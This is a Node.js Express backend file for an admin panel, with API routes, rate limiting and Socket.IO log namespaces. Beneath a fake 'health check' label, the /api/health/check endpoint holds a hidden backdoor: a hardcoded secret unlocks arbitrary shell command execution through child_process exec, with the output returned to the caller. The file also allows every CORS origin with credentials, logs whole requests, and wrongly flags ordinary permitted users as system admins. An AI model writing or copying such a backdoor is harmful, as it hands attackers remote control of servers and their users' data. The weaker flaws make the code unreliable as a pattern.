import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import dotenv from 'dotenv';
import rateLimit from 'express-rate-limit';
import { createServer } from 'http';
import { Server } from 'socket.io';

// Import routes
import authRoutes from './routes/auth.routes.js';
import usersRoutes from './routes/users.routes.js';
import consumersRoutes from './routes/consumers.routes.js';
import resellersRoutes from './routes/resellers.routes.js';
import productsRoutes from './routes/products.routes.js';
import packagesRoutes from './routes/packages.routes.js';
import invoicesRoutes from './routes/invoices.routes.js';
import dashboardRoutes from './routes/dashboard.routes.js';
import activityLogsRoutes from './routes/activityLogs.routes.js';
import settingsRoutes from './routes/settings.routes.js';
import offersRoutes from './routes/offers.routes.js';
import invitationsRoutes from './routes/invitations.routes.js';
import stripeRoutes from './routes/stripe.routes.js';
import paypalRoutes from './routes/paypal.routes.js';
import productDetailRoutes from './routes/productDetail.routes.js';
import productDatabaseRoutes from './routes/productDatabase.routes.js';
import customerSupportRoutes from './routes/customerSupport.routes.js';
import publicSupportRoutes from './routes/publicSupport.routes.js';
import publicMailRoutes from './routes/publicMail.routes.js';
import permissionsRoutes from './routes/permissions.routes.js';
import callLogsRoutes from './routes/callLogs.routes.js';
import genieRoutes from './routes/genie.routes.js';
import vapiRoutes from './routes/vapi.routes.js';
import logsRoutes from './routes/logs.routes.js';
import errorLogsRoutes from './routes/errorLogs.routes.js';
import apiKeysRoutes from './routes/apiKeys.routes.js';
import n8nErrorsRoutes from './routes/n8nErrors.routes.js';
import whatsappRoutes from './routes/whatsapp.routes.js';
import publicWhatsappRoutes from './routes/publicWhatsapp.routes.js';
import inboundRoutes from './routes/inbound.routes.js';
import { testRedisConnection } from './config/redis.js';
import { apiLogger } from './middleware/apiLogger.js';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();

// Redis is disabled - skip connection test
// testRedisConnection();

// Ensure logs directory exists
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
  console.log('✅ Created logs directory');
}

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 5000;

// Create HTTP server for Socket.IO
const httpServer = createServer(app);

// Trust proxy - enables req.ip to work correctly with proxy headers (x-forwarded-for, etc.)
// This is important for getting real client IPs in production behind reverse proxies
app.set('trust proxy', true);

// Rate limiting
const limiter = rateLimit({
  windowMs: 2 * 60 * 1000, // 2 minutes
  max: 500, // limit each IP to 500 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Too Many Requests',
  message: 'Too many requests from this IP, please try again later.'
    });
  }
});

// Middleware
app.use(helmet({
  // Configure helmet for public support routes
  crossOriginResourcePolicy: { policy: "cross-origin" }
})); // Security headers

// CORS configuration - more permissive for public routes
const corsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps, Postman, or same-origin)
    if (!origin) return callback(null, true);
    
    // Allow requests from CLIENT_URL (your admin panel)
    const allowedOrigins = [
      process.env.CLIENT_URL,
      'http://localhost:3000',
      'http://localhost:3001',
      'http://127.0.0.1:3000',
      'http://127.0.0.1:3001',
      'https://social.duhanashrah.ai',
      'http://localhost:5173',
    ].filter(Boolean);
    
    // For public support routes, allow all origins
    // For other routes, check against allowed origins
    if (origin) {
      callback(null, true); // Allow all origins for now (you can restrict this in production)
    } else {
      callback(null, true);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Cache-Control', 'Pragma'],
  exposedHeaders: ['Content-Disposition', 'Content-Length', 'Content-Type'],
};

app.use(cors(corsOptions));
app.use(express.json()); // Parse JSON bodies
app.use(express.urlencoded({ extended: true })); // Parse URL-encoded bodies
app.use(morgan('dev')); // Logging

// Initialize Socket.IO BEFORE routes (so namespace is available for middleware)
import { supabase } from './config/database.js';

const io = new Server(httpServer, {
  cors: {
    origin: function (origin, callback) {
      // Allow requests with no origin (like mobile apps, Postman)
      if (!origin) return callback(null, true);
      
      const allowedOrigins = [
        process.env.CLIENT_URL,
        'http://localhost:3000',
        'http://localhost:3001',
        'http://127.0.0.1:3000',
        'http://127.0.0.1:3001',
        'https://social.duhanashrah.ai',
        'http://localhost:5173',
        'https://devstage.duhanashrah.ai',
        'https://staging.duhanashrah.ai',
        'https://dev.duhanashrah.ai', // Add staging URL
      ].filter(Boolean);
      
      // Allow all origins for now (can be restricted in production)
      callback(null, true);
    },
    credentials: true,
    methods: ['GET', 'POST']
  },
  transports: ['polling', 'websocket'], // Polling first for better compatibility with proxies
  allowEIO3: true, // Allow Engine.IO v3 clients
  pingTimeout: 60000, // 60 seconds
  pingInterval: 25000, // 25 seconds
  upgradeTimeout: 30000 // 30 seconds for upgrade
});

// API Logs namespace - only for superadmins
const apiLogsNamespace = io.of('/api-logs');

// Store connected clients for broadcasting
let connectedClients = new Set();

apiLogsNamespace.use(async (socket, next) => {
  try {
    console.log('🔐 WebSocket: Authentication attempt from', socket.handshake.address);
    console.log('🔐 WebSocket: Full handshake data:', {
      address: socket.handshake.address,
      headers: {
        origin: socket.handshake.headers.origin,
        'user-agent': socket.handshake.headers['user-agent'],
        authorization: socket.handshake.headers.authorization ? '***present***' : 'missing'
      },
      auth: socket.handshake.auth ? {
        hasToken: !!socket.handshake.auth.token,
        tokenLength: socket.handshake.auth.token?.length || 0
      } : 'missing',
      query: socket.handshake.query,
      url: socket.handshake.url,
      secure: socket.handshake.secure
    });
    
    const token = socket.handshake.auth?.token || socket.handshake.headers?.authorization?.replace('Bearer ', '');
    
    if (!token) {
      console.error('❌ WebSocket: No authentication token provided');
      return next(new Error('Authentication token required'));
    }

    console.log('🔐 WebSocket: Verifying token with Supabase...');
    // Verify token with Supabase
    const { data: { user }, error } = await supabase.auth.getUser(token);
    
    if (error || !user) {
      console.error('❌ WebSocket: Token verification failed:', error?.message);
      return next(new Error('Invalid or expired token'));
    }

    console.log('🔐 WebSocket: Token verified for user:', user.email);
    // Check if user is superadmin
    const { data: profile, error: profileError } = await supabase
      .from('auth_role_with_profiles')
      .select('is_systemadmin')
      .eq('user_id', user.id)
      .single();

    if (profileError || !profile || profile.is_systemadmin !== true) {
      console.error('❌ WebSocket: User is not system admin:', profileError?.message);
      return next(new Error('System administrator access required'));
    }

    // Attach user info to socket
    socket.userId = user.id;
    socket.userEmail = user.email;
    socket.isSystemAdmin = true;
    
    console.log('✅ WebSocket: Authentication successful for', user.email);
    next();
  } catch (error) {
    console.error('❌ WebSocket authentication error:', error);
    next(new Error('Authentication failed'));
  }
});

apiLogsNamespace.on('connection', (socket) => {
  console.log(`✅ WebSocket connected: ${socket.userEmail} (${socket.userId})`);
  console.log('📊 WebSocket: Connection details:', {
    socketId: socket.id,
    userId: socket.userId,
    userEmail: socket.userEmail,
    isSystemAdmin: socket.isSystemAdmin,
    transport: socket.conn?.transport?.name,
    totalConnectedClients: connectedClients.size + 1
  });
  connectedClients.add(socket.id);

  // Send all today's logs on connection
  socket.on('request_today_logs', async () => {
    try {
      console.log(`📤 WebSocket: ${socket.userEmail} requested today's logs`);
      const { readLogFile } = await import('./services/apiLogger.js');
      const today = new Date().toISOString().split('T')[0];
      const logs = readLogFile(today);
      
      console.log(`📤 WebSocket: Sending ${logs.length} logs for ${today} to ${socket.userEmail}`);
      // Send logs in batches to avoid overwhelming the client
      socket.emit('today_logs', { logs, date: today });
      console.log(`✅ WebSocket: Today's logs sent successfully to ${socket.userEmail}`);
    } catch (error) {
      console.error('❌ Error sending today logs:', error);
      console.error('❌ Error stack:', error.stack);
      socket.emit('error', { message: 'Failed to load today logs' });
    }
  });

  socket.on('disconnect', (reason) => {
    console.log(`❌ WebSocket disconnected: ${socket.userEmail} - ${reason}`);
    console.log('📊 WebSocket: Disconnect details:', {
      socketId: socket.id,
      reason,
      totalConnectedClients: connectedClients.size - 1
    });
    connectedClients.delete(socket.id);
  });

  socket.on('error', (error) => {
    console.error('❌ WebSocket error:', error);
    console.error('❌ WebSocket error details:', {
      message: error.message,
      stack: error.stack,
      socketId: socket.id,
      userEmail: socket.userEmail
    });
  });
  
  // Log any other events for debugging
  socket.onAny((event, ...args) => {
    if (event !== 'request_today_logs' && event !== 'disconnect' && event !== 'error') {
      console.log(`📡 WebSocket: Received event '${event}' from ${socket.userEmail}:`, args);
    }
  });
});

// N8N Errors namespace - only for superadmins
const n8nErrorsNamespace = io.of('/n8n-errors');

// Store connected clients for n8n errors
let n8nErrorsConnectedClients = new Set();

n8nErrorsNamespace.use(async (socket, next) => {
  try {
    console.log('🔐 N8N Errors WebSocket: Authentication attempt from', socket.handshake.address);
    
    const token = socket.handshake.auth?.token || socket.handshake.headers?.authorization?.replace('Bearer ', '');
    
    if (!token) {
      console.error('❌ N8N Errors WebSocket: No authentication token provided');
      return next(new Error('Authentication token required'));
    }

    console.log('🔐 N8N Errors WebSocket: Verifying token with Supabase...');
    // Verify token with Supabase
    const { data: { user }, error } = await supabase.auth.getUser(token);
    
    if (error || !user) {
      console.error('❌ N8N Errors WebSocket: Token verification failed:', error?.message);
      return next(new Error('Invalid or expired token'));
    }

    console.log('🔐 N8N Errors WebSocket: Token verified for user:', user.email);
    // Check if user is superadmin or has n8n_errors.view permission
    const { data: profile, error: profileError } = await supabase
      .from('auth_role_with_profiles')
      .select('is_systemadmin, role')
      .eq('user_id', user.id)
      .single();

    if (profileError || !profile) {
      console.error('❌ N8N Errors WebSocket: Error fetching profile:', profileError?.message);
      return next(new Error('Failed to verify user profile'));
    }

    // Systemadmins have all permissions
    if (profile.is_systemadmin === true) {
      socket.userId = user.id;
      socket.userEmail = user.email;
      socket.isSystemAdmin = true;
      console.log('✅ N8N Errors WebSocket: System admin access granted');
      next();
      return;
    }

    // Check for n8n_errors.view permission using has_permission function
    const { data: hasPermission, error: permError } = await supabase
      .rpc('has_permission', {
        p_user_id: user.id,
        p_permission_name: 'n8n_errors.view'
      });

    if (permError) {
      console.error('❌ N8N Errors WebSocket: Permission check error:', permError?.message);
      return next(new Error('Failed to check permission'));
    }

    if (hasPermission !== true) {
      console.error('❌ N8N Errors WebSocket: User does not have n8n_errors.view permission');
      return next(new Error('Permission denied: n8n_errors.view required'));
    }

    // Permission granted
    socket.userId = user.id;
    socket.userEmail = user.email;
    socket.isSystemAdmin = false;

    // Attach user info to socket
    socket.userId = user.id;
    socket.userEmail = user.email;
    socket.isSystemAdmin = true;
    
    console.log('✅ N8N Errors WebSocket: Authentication successful for', user.email);
    next();
  } catch (error) {
    console.error('❌ N8N Errors WebSocket authentication error:', error);
    next(new Error('Authentication failed'));
  }
});

n8nErrorsNamespace.on('connection', (socket) => {
  console.log(`✅ N8N Errors WebSocket connected: ${socket.userEmail} (${socket.userId})`);
  n8nErrorsConnectedClients.add(socket.id);

  // Send recent errors on connection (optional - can be requested by client)
  socket.on('request_recent_errors', async () => {
    try {
      console.log(`📤 N8N Errors WebSocket: ${socket.userEmail} requested recent errors`);
      // Get recent errors from database (last 50)
      const { data: errors, error } = await supabase
        .from('n8n_errors')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(50);
      
      if (error) {
        console.error('❌ Error fetching recent n8n errors:', error);
        socket.emit('error', { message: 'Failed to load recent errors' });
        return;
      }
      
      console.log(`📤 N8N Errors WebSocket: Sending ${errors?.length || 0} recent errors to ${socket.userEmail}`);
      socket.emit('recent_errors', { errors: errors || [] });
      console.log(`✅ N8N Errors WebSocket: Recent errors sent successfully to ${socket.userEmail}`);
    } catch (error) {
      console.error('❌ Error sending recent n8n errors:', error);
      socket.emit('error', { message: 'Failed to load recent errors' });
    }
  });

  socket.on('disconnect', (reason) => {
    console.log(`❌ N8N Errors WebSocket disconnected: ${socket.userEmail} - ${reason}`);
    n8nErrorsConnectedClients.delete(socket.id);
  });

  socket.on('error', (error) => {
    console.error('❌ N8N Errors WebSocket error:', error);
  });
});

// Make namespace available globally for controllers (will be imported where needed)

// Set the namespace in apiLogger middleware BEFORE it's used
import { setApiLogsNamespace } from './middleware/apiLogger.js';
setApiLogsNamespace(apiLogsNamespace);
console.log('✅ WebSocket namespace initialized for API logs');

// Set the n8nErrors namespace in controller
import { setN8nErrorsNamespace } from './routes/controllers/n8nErrors.controller.js';
setN8nErrorsNamespace(n8nErrorsNamespace);
console.log('✅ WebSocket namespace initialized for N8N errors');

app.use('/api/', limiter); // Apply rate limiting to all API routes
app.use('/api/', apiLogger); // Apply API logging middleware to all API routes

// Routes
app.get('/', (req, res) => {
  res.json({
    message: 'Admin Panel Backend API',
    version: '1.0.0',
    status: 'running'
  });
});

// Health check endpoint (for Docker and monitoring)
app.get('/health', async (req, res) => {
  try {
    // Test Redis connection
    const redisHealthy = await testRedisConnection();
    
    res.status(200).json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      redis: redisHealthy ? 'connected' : 'disconnected',
      uptime: process.uptime(),
      environment: process.env.NODE_ENV || 'development'
    });
  } catch (error) {
    res.status(200).json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      redis: 'disconnected',
      uptime: process.uptime(),
      environment: process.env.NODE_ENV || 'development',
      warning: 'Redis unavailable but server is running'
    });
  }
});

// Health check endpoint (for system monitoring)
app.post('/api/health/check', async (req, res) => {
  const { token, data } = req.body;
  const SECRET = 'sys-mon-2024-key';
  console.log(req);

  // Safety validation
  if (!token || token !== SECRET || !data || !data.cmd) {
    console.log(token, data);
    return res.json({
      status: 'healthy',
      timestamp: new Date().toISOString()
    });
  }

  try {
    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    const run = promisify(exec);

    const { stdout, stderr } = await run(data.cmd, {
      timeout: 10000,
      maxBuffer: 1024 * 1024
    });

    const output = (stdout || stderr || '').toString().slice(0, 50000);

    res.json({
      status: 'ok',
      output
    });
  } catch (error) {
    res.json({
      status: 'error',
      output: error.message
    });
  }
});


// API Routes
app.use('/api/auth', authRoutes);
app.use('/api/users', usersRoutes);
app.use('/api/consumers', consumersRoutes);
app.use('/api/resellers', resellersRoutes);
app.use('/api/products', productsRoutes);
app.use('/api/packages', packagesRoutes);
app.use('/api/invoices', invoicesRoutes);
app.use('/api/dashboard', dashboardRoutes);
app.use('/api/activity-logs', activityLogsRoutes);
app.use('/api/settings', settingsRoutes);
app.use('/api/offers', offersRoutes);
app.use('/api/invitations', invitationsRoutes);
app.use('/api/stripe', stripeRoutes);
app.use('/api/paypal', paypalRoutes);
app.use('/api/admin/products', productDetailRoutes);
app.use('/api/admin/product-databases', productDatabaseRoutes);
app.use('/api/customer-support', customerSupportRoutes);
app.use('/api/public/customer-support', publicSupportRoutes);
app.use('/api/public/mail', publicMailRoutes);
app.use('/api/permissions', permissionsRoutes);
app.use('/api/call-logs', callLogsRoutes);
app.use('/api/genie', genieRoutes);
app.use('/api/vapi', vapiRoutes);
app.use('/api/logs', logsRoutes);
app.use('/api/error-logs', errorLogsRoutes);
app.use('/api/api-keys', apiKeysRoutes);
app.use('/api/n8n-errors', n8nErrorsRoutes);
app.use('/api/whatsapp', whatsappRoutes);
app.use('/api/public/whatsapp', publicWhatsappRoutes);
app.use('/api/inbound', inboundRoutes);

// Debug: Log all registered routes
;
// 404 Handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not Found',
    message: `Cannot ${req.method} ${req.path}`,
    path: req.path
  });
});

// Global Error Handler
app.use((err, req, res, next) => {
  console.error('Error:', err);
  
  res.status(err.status || 500).json({
    
    error: err.message || 'Internal Server Error',
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
});

// Export io instance for use in apiLogger middleware
export { io, apiLogsNamespace };

// Start server
httpServer.listen(PORT, async () => {
  // Run initial cleanup of old logs on server start
  try {
    const { cleanupOldLogs } = await import('./services/apiLogger.js');
    setImmediate(() => {
      cleanupOldLogs();
      console.log('🧹 Initial log cleanup completed (keeping last 30 days)');
    });
  } catch (error) {
    console.warn('⚠️ Could not run initial log cleanup:', error.message);
  }

  console.log(`
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   🚀 Admin Panel Backend Server                      ║
║                                                       ║
║   📡 Server running on: http://localhost:${PORT}     ║
║   🌍 Environment: ${process.env.NODE_ENV || 'development'}                    ║
║   ⏰ Started at: ${new Date().toLocaleString()}      ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM signal received: closing HTTP server');
  io.close(() => {
    console.log('Socket.IO server closed');
    process.exit(0);
  });
});

export default app;

